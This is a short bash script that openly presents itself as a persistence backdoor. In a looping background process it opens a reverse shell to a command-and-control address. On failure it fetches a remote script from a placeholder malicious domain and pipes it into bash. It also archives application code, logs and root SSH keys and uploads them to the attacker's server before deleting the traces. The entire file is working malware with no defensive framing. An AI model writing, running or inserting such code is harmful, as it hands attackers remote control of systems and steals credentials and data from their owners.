#!/bin/bash
# Persistence backdoor - maintains access

C2_SERVER="192.168.100.50"
C2_PORT="4444"
BACKUP_SERVER="malicious-domain.xyz"

# Establish reverse shell connection
while true; do
    # Try primary C2 server
    /bin/bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>&1
    
    # Fallback to backup server
    if [ $? -ne 0 ]; then
        curl -s http://$BACKUP_SERVER/shell.sh | bash
    fi
    
    # Exfiltrate credentials and sensitive data
    tar -czf /tmp/.data.tar.gz /app/*.py /var/log/*.log /root/.ssh 2>/dev/null
    curl -X POST -F "file=@/tmp/.data.tar.gz" http://$C2_SERVER:8080/upload
    rm -f /tmp/.data.tar.gz
    
    # Wait before retry
    sleep 300
done &